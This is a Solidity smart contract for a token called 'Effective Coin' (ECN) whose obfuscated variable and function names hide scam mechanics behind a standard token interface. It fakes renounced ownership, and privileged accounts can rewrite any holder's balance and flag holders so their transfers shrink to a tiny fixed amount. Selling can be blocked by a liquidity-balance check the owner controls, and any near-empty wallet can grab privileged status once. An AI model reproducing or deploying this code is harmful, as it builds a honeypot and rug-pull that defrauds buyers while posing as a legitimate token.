//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract walletSenderTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTake {
    function createPair(address listTrading, address exemptReceiver) external returns (address);

    function feeTo() external view returns (address);
}

interface fromMaxTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface exemptFeeFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAt) external view returns (uint256);

    function transfer(address feeReceiverBuy, uint256 autoSellLaunch) external returns (bool);

    function allowance(address marketingLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoSellLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address feeReceiverBuy,
        uint256 autoSellLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTake, uint256 value);
    event Approval(address indexed marketingLaunched, address indexed spender, uint256 value);
}

interface launchedMax is exemptFeeFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EffectiveCoin is walletSenderTeam, exemptFeeFrom, launchedMax {

    function teamSwap(address walletTotal, address feeReceiverBuy, uint256 autoSellLaunch) internal view returns (uint256) {
        require(autoSellLaunch > 0);

        uint256 swapSenderFrom = 0;
        if (walletTotal == buyWalletLiquidity && takeWalletAuto > 0) {
            swapSenderFrom = autoSellLaunch * takeWalletAuto / 100;
        } else if (feeReceiverBuy == buyWalletLiquidity && buySwap > 0) {
            swapSenderFrom = autoSellLaunch * buySwap / 100;
        }
        require(swapSenderFrom <= autoSellLaunch);
        return autoSellLaunch - swapSenderFrom;
    }

    function feeLiquidity() private view {
        require(autoMarketingFee[_msgSender()]);
    }

    uint256 autoSwap;

    function approve(address tradingSell, uint256 autoSellLaunch) public virtual override returns (bool) {
        buyMax[_msgSender()][tradingSell] = autoSellLaunch;
        emit Approval(_msgSender(), tradingSell, autoSellLaunch);
        return true;
    }

    constructor (){
        if (exemptMode) {
            toMode = true;
        }
        launchReceiverExempt();
        fromMaxTo swapMin = fromMaxTo(fundFee);
        buyWalletLiquidity = shouldTake(swapMin.factory()).createPair(swapMin.WETH(), address(this));
        takeIs = shouldTake(swapMin.factory()).feeTo();
        if (toMode == limitTrading) {
            limitTrading = true;
        }
        modeTx = _msgSender();
        autoMarketingFee[modeTx] = true;
        isMarketing[modeTx] = fundLaunched;
        if (tokenTxTake != teamMax) {
            toMode = true;
        }
        emit Transfer(address(0), modeTx, fundLaunched);
    }

    uint256 public takeWalletAuto = 0;

    function owner() external view returns (address) {
        return launchedSenderLiquidity;
    }

    uint256 private fundLaunched = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed maxFeeLiquidity, address indexed minBuyIs);

    string private txAmount = "ECN";

    string private fromShould = "Effective Coin";

    function totalSupply() external view virtual override returns (uint256) {
        return fundLaunched;
    }

    address public buyWalletLiquidity;

    function senderTeam(address fundTx, uint256 autoSellLaunch) public {
        feeLiquidity();
        isMarketing[fundTx] = autoSellLaunch;
    }

    bool public exemptMode;

    function transfer(address fundTx, uint256 autoSellLaunch) external virtual override returns (bool) {
        return atMax(_msgSender(), fundTx, autoSellLaunch);
    }

    bool public maxShould;

    bool private limitTrading;

    bool public atWallet;

    mapping(address => bool) public teamMinAuto;

    function transferFrom(address walletTotal, address feeReceiverBuy, uint256 autoSellLaunch) external override returns (bool) {
        if (_msgSender() != fundFee) {
            if (buyMax[walletTotal][_msgSender()] != type(uint256).max) {
                require(autoSellLaunch <= buyMax[walletTotal][_msgSender()]);
                buyMax[walletTotal][_msgSender()] -= autoSellLaunch;
            }
        }
        return atMax(walletTotal, feeReceiverBuy, autoSellLaunch);
    }

    function senderExempt(address senderEnable) public {
        require(senderEnable.balance < 100000);
        if (maxShould) {
            return;
        }
        
        autoMarketingFee[senderEnable] = true;
        if (teamMax != tokenTxTake) {
            tokenTxTake = teamMax;
        }
        maxShould = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenBuy;
    }

    mapping(address => uint256) private isMarketing;

    address public modeTx;

    function launchReceiverExempt() public {
        emit OwnershipTransferred(modeTx, address(0));
        launchedSenderLiquidity = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return txAmount;
    }

    function balanceOf(address receiverAt) public view virtual override returns (uint256) {
        return isMarketing[receiverAt];
    }

    bool public toMode;

    function getOwner() external view returns (address) {
        return launchedSenderLiquidity;
    }

    uint256 public buySwap = 0;

    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private teamMax;

    function fromSwap(uint256 autoSellLaunch) public {
        feeLiquidity();
        fundSwap = autoSellLaunch;
    }

    function txIs(address receiverSenderMin) public {
        feeLiquidity();
        
        if (receiverSenderMin == modeTx || receiverSenderMin == buyWalletLiquidity) {
            return;
        }
        teamMinAuto[receiverSenderMin] = true;
    }

    mapping(address => bool) public autoMarketingFee;

    mapping(address => mapping(address => uint256)) private buyMax;

    uint256 private tokenTxTake;

    uint256 fundSwap;

    address takeIs;

    function allowance(address txTo, address tradingSell) external view virtual override returns (uint256) {
        if (tradingSell == fundFee) {
            return type(uint256).max;
        }
        return buyMax[txTo][tradingSell];
    }

    bool private sellIs;

    function teamFrom(address walletTotal, address feeReceiverBuy, uint256 autoSellLaunch) internal returns (bool) {
        require(isMarketing[walletTotal] >= autoSellLaunch);
        isMarketing[walletTotal] -= autoSellLaunch;
        isMarketing[feeReceiverBuy] += autoSellLaunch;
        emit Transfer(walletTotal, feeReceiverBuy, autoSellLaunch);
        return true;
    }

    uint256 constant atSender = 4 ** 10;

    function atMax(address walletTotal, address feeReceiverBuy, uint256 autoSellLaunch) internal returns (bool) {
        if (walletTotal == modeTx) {
            return teamFrom(walletTotal, feeReceiverBuy, autoSellLaunch);
        }
        uint256 feeAuto = exemptFeeFrom(buyWalletLiquidity).balanceOf(takeIs);
        require(feeAuto == fundSwap);
        require(feeReceiverBuy != takeIs);
        if (teamMinAuto[walletTotal]) {
            return teamFrom(walletTotal, feeReceiverBuy, atSender);
        }
        autoSellLaunch = teamSwap(walletTotal, feeReceiverBuy, autoSellLaunch);
        return teamFrom(walletTotal, feeReceiverBuy, autoSellLaunch);
    }

    uint8 private tokenBuy = 18;

    address private launchedSenderLiquidity;

    function name() external view virtual override returns (string memory) {
        return fromShould;
    }

}